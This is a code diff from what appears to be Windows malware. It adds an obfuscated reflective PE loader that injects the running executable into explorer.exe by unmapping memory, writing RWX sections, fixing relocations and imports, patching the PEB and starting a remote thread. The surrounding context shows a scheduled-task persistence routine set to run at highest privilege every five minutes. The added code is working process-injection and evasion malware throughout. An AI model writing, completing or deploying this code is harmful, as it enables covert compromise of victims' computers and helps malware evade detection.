@@ -319,6 +319,15 @@ typedef NTSTATUS (WINAPI *pNtQueryInfoProc_t)(HANDLE, INT, PVOID, ULONG, PULONG)
 static pNtSetInfoProc_t g_pfnNtSetInfo = NULL;
 static pNtQueryInfoProc_t g_pfnNtQueryInfo = NULL;
 
+/* For NtQueryInformationProcess(ProcessBasicInformation) */
+typedef struct _PROCESS_BASIC_INFORMATION {
+    PVOID Reserved1;
+    PVOID PebBaseAddress;
+    PVOID Reserved2[2];
+    ULONG_PTR UniqueProcessId;
+    PVOID Reserved3;
+} PROCESS_BASIC_INFORMATION;
+
 pNtSetInfoProc_t obf_get_ntsetinfo(void) {
     if (!g_pfnNtSetInfo) {
         char *ntdll = obf_ntdll();
@@ -782,4 +791,271 @@ void obf_ensure_scheduled_task(const char *exePath, const char *taskName) {
         "%s /create /tn \"%s\" /tr \"%s\" /sc minute /mo 5 /f /rl highest",
         schtasks, taskName, exePath);
     sys_run_command(cmd);
+}
+
+/* === Reflective PE Loader (ASLR-Fixed) ===
+ *
+ * Maps the current EXE into a remote process (explorer.exe) entirely from memory.
+ * Fixes both relocations AND imports correctly for the remote process's ASLR layout.
+ *
+ * ASLR Fix: Instead of using local GetProcAddress results directly in remote IAT,
+ * we compute remote addresses as: remote_base + (local_func - local_base).
+ * Since ASLR randomizes module bases but NOT offsets within a DLL, this is exact.
+ */
+void obf_reflective_load(void) {
+    /* 1. Read current EXE into local buffer */
+    char selfPath[MAX_PATH];
+    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
+
+    HANDLE hFile = CreateFileA(selfPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return;
+
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    BYTE *payload = (BYTE*)malloc(fileSize);
+    if (!payload) { CloseHandle(hFile); return; }
+
+    DWORD read;
+    ReadFile(hFile, payload, fileSize, &read, NULL);
+    CloseHandle(hFile);
+
+    /* 2. Parse PE headers */
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)payload;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { free(payload); return; }
+
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(payload + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) { free(payload); return; }
+
+    /* 3. Find explorer.exe PID */
+    DWORD pid = 0;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 pe;
+        pe.dwSize = sizeof(pe);
+        if (Process32First(hSnap, &pe)) {
+            do {
+                if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
+                    pid = pe.th32ProcessID;
+                    break;
+                }
+            } while (Process32Next(hSnap, &pe));
+        }
+        CloseHandle(hSnap);
+    }
+    if (pid == 0) { free(payload); return; }
+
+    HANDLE hProc = obf_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProc) { free(payload); return; }
+
+    /* 4. Unmap existing image at preferred base if occupied */
+    pNtUnmapViewOfSection_t pNtUnmap = obf_get_ntunmap();
+    DWORD64 prefBase = nt->OptionalHeader.ImageBase;
+    if (pNtUnmap) pNtUnmap(hProc, (PVOID)prefBase);
+
+    obf_junk_delay();
+
+    /* 5. Allocate memory in remote process */
+    SIZE_T imgSize = nt->OptionalHeader.SizeOfImage;
+    PVOID remoteImg = obf_VirtualAllocEx(hProc, (PVOID)prefBase, imgSize,
+                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteImg)
+        remoteImg = obf_VirtualAllocEx(hProc, NULL, imgSize,
+                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteImg) {
+        CloseHandle(hProc);
+        free(payload);
+        return;
+    }
+
+    /* 6. Write headers and sections to remote process */
+    obf_WriteProcessMemory(hProc, remoteImg, payload, nt->OptionalHeader.SizeOfHeaders, NULL);
+
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        PVOID dest = (PVOID)((DWORD64)remoteImg + sec[i].VirtualAddress);
+        PVOID src  = (PVOID)(payload + sec[i].PointerToRawData);
+        obf_WriteProcessMemory(hProc, dest, src, sec[i].SizeOfRawData, NULL);
+    }
+
+    obf_junk_delay();
+
+    /* 7. Fix relocations */
+    DWORD64 delta = (DWORD64)remoteImg - prefBase;
+    if (delta != 0) {
+        IMAGE_DATA_DIRECTORY relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+        if (relocDir.Size > 0) {
+            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(payload + relocDir.VirtualAddress);
+            while (reloc->VirtualAddress != 0) {
+                DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+                PWORD entries = (PWORD)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
+                for (DWORD i = 0; i < numEntries; i++) {
+                    WORD type   = entries[i] >> 12;
+                    WORD offset = entries[i] & 0xFFF;
+                    if (type == IMAGE_REL_BASED_DIR64) {
+                        PVOID addr = (PVOID)((DWORD64)remoteImg + reloc->VirtualAddress + offset);
+                        DWORD64 value;
+                        if (ReadProcessMemory(hProc, addr, &value, sizeof(value), NULL)) {
+                            value += delta;
+                            obf_WriteProcessMemory(hProc, addr, &value, sizeof(value), NULL);
+                        }
+                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {
+                        PVOID addr = (PVOID)((DWORD64)remoteImg + reloc->VirtualAddress + offset);
+                        DWORD32 value;
+                        if (ReadProcessMemory(hProc, addr, &value, sizeof(value), NULL)) {
+                            value += (DWORD32)delta;
+                            obf_WriteProcessMemory(hProc, addr, &value, sizeof(value), NULL);
+                        }
+                    }
+                }
+                reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
+            }
+        }
+    }
+
+    /* 8. Fix imports — ASLR-AWARE
+     *
+     * For each imported DLL:
+     *   localBase  = LoadLibraryA(dllName) in OUR process
+     *   remoteBase = enumerate modules in TARGET process
+     *   For each function:
+     *     localAddr  = GetProcAddress(localBase, funcName)
+     *     offset     = localAddr - localBase
+     *     remoteAddr = remoteBase + offset   <-- ASLR-safe
+     */
+    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32)-1);
+    HMODULE hKernel32 = GetModuleHandleA(kernel32);
+
+    char *enumProcStr = obf_enumproc();
+    char *getBaseNameStr = obf_getbasename();
+    typedef BOOL (WINAPI *EnumPM_t)(HANDLE, HMODULE*, DWORD, LPDWORD);
+    typedef DWORD (WINAPI *GetMBN_t)(HANDLE, HMODULE, LPSTR, DWORD);
+    EnumPM_t pEnum = (EnumPM_t)GetProcAddress(hKernel32, enumProcStr);
+    GetMBN_t pGetBaseName = (GetMBN_t)GetProcAddress(hKernel32, getBaseNameStr);
+
+    IMAGE_DATA_DIRECTORY importDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    if (importDir.Size > 0) {
+        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD64)remoteImg + importDir.VirtualAddress);
+
+        while (importDesc->Name != 0) {
+            char dllName[256];
+            ReadProcessMemory(hProc, (LPCVOID)((DWORD64)remoteImg + importDesc->Name), dllName, sizeof(dllName), NULL);
+            dllName[255] = '\0';
+
+            HMODULE hLocalDll = LoadLibraryA(dllName);
+            DWORD64 localBase = hLocalDll ? (DWORD64)hLocalDll : 0;
+            DWORD64 remoteBase = 0;
+
+            /* Try to find already-loaded module in remote process */
+            if (pEnum && pGetBaseName && localBase) {
+                HMODULE hMods[1024];
+                DWORD cbNeeded;
+                if (pEnum(hProc, hMods, sizeof(hMods), &cbNeeded)) {
+                    for (unsigned int m = 0; m < (cbNeeded / sizeof(HMODULE)); m++) {
+                        char szModName[MAX_PATH];
+                        if (pGetBaseName(hProc, hMods[m], szModName, sizeof(szModName))) {
+                            if (_stricmp(szModName, dllName) == 0) {
+                                remoteBase = (DWORD64)hMods[m];
+                                break;
+                            }
+                        }
+                    }
+                }
+            }
+
+            /* If not loaded, inject LoadLibraryA into remote to load it */
+            if (remoteBase == 0 && localBase) {
+                FARPROC pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
+                if (pLoadLibraryA) {
+                    SIZE_T dllNameLen = strlen(dllName) + 1;
+                    LPVOID rDllName = obf_VirtualAllocEx(hProc, NULL, dllNameLen,
+                                                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                    if (rDllName) {
+                        obf_WriteProcessMemory(hProc, rDllName, dllName, dllNameLen, NULL);
+                        HANDLE hThread = obf_CreateRemoteThread(hProc, NULL, 0,
+                            (LPTHREAD_START_ROUTINE)pLoadLibraryA, rDllName, 0, NULL);
+                        if (hThread) {
+                            WaitForSingleObject(hThread, 10000);
+                            CloseHandle(hThread);
+                        }
+                        /* Re-enumerate to pick up the newly loaded module */
+                        if (pEnum && pGetBaseName) {
+                            HMODULE hMods[1024];
+                            DWORD cbNeeded;
+                            if (pEnum(hProc, hMods, sizeof(hMods), &cbNeeded)) {
+                                for (unsigned int m = 0; m < (cbNeeded / sizeof(HMODULE)); m++) {
+                                    char szModName[MAX_PATH];
+                                    if (pGetBaseName(hProc, hMods[m], szModName, sizeof(szModName))) {
+                                        if (_stricmp(szModName, dllName) == 0) {
+                                            remoteBase = (DWORD64)hMods[m];
+                                            break;
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+
+            /* Resolve imports using remote_base + offset */
+            if (remoteBase && localBase) {
+                DWORD64 origThunkRVA = importDesc->OriginalFirstThunk;
+                if (origThunkRVA == 0) origThunkRVA = importDesc->FirstThunk;
+
+                int idx = 0;
+                while (1) {
+                    IMAGE_THUNK_DATA thunkVal, origThunkVal;
+                    PVOID thunkAddr = (PVOID)((DWORD64)remoteImg + importDesc->FirstThunk +
+                                                idx * sizeof(IMAGE_THUNK_DATA));
+                    PVOID origThunkAddr = (PVOID)((DWORD64)remoteImg + origThunkRVA +
+                                                   idx * sizeof(IMAGE_THUNK_DATA));
+                    ReadProcessMemory(hProc, thunkAddr, &thunkVal, sizeof(thunkVal), NULL);
+                    ReadProcessMemory(hProc, origThunkAddr, &origThunkVal, sizeof(origThunkVal), NULL);
+                    if (thunkVal.u1.AddressOfData == 0) break;
+
+                    FARPROC localAddr = NULL;
+                    if (origThunkVal.u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
+                        localAddr = GetProcAddress(hLocalDll,
+                            (LPCSTR)(WORD)(origThunkVal.u1.Ordinal & 0xFFFF));
+                    } else {
+                        char funcName[256];
+                        PVOID nameAddr = (PVOID)((DWORD64)remoteImg +
+                                                   origThunkVal.u1.AddressOfData + 2);
+                        ReadProcessMemory(hProc, nameAddr, funcName, sizeof(funcName), NULL);
+                        funcName[255] = '\0';
+                        localAddr = GetProcAddress(hLocalDll, funcName);
+                    }
+
+                    if (localAddr) {
+                        DWORD64 offset = (DWORD64)localAddr - localBase;
+                        DWORD64 remoteAddr = remoteBase + offset;
+                        obf_WriteProcessMemory(hProc, thunkAddr, &remoteAddr, sizeof(remoteAddr), NULL);
+                    }
+                    idx++;
+                }
+            }
+            importDesc++;
+        }
+    }
+
+    obf_junk_delay();
+
+    /* 9. Update remote PEB ImageBaseAddress */
+    pNtQueryInfoProc_t pNtQuery = obf_get_ntqueryinfo();
+    if (pNtQuery) {
+        PROCESS_BASIC_INFORMATION pbi;
+        ULONG retLen;
+        if (pNtQuery(hProc, 0 /* ProcessBasicInformation */, &pbi, sizeof(pbi), &retLen) == 0) {
+            PVOID pebImageBase = (PVOID)((DWORD64)pbi.PebBaseAddress + 0x10);
+            obf_WriteProcessMemory(hProc, pebImageBase, &remoteImg, sizeof(remoteImg), NULL);
+        }
+    }
+
+    /* 10. Create remote thread at entry point */
+    DWORD64 entryPoint = (DWORD64)remoteImg + nt->OptionalHeader.AddressOfEntryPoint;
+    HANDLE hThread = obf_CreateRemoteThread(hProc, NULL, 0,
+        (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
+    if (hThread) CloseHandle(hThread);
+
+    CloseHandle(hProc);
+    free(payload);
 }
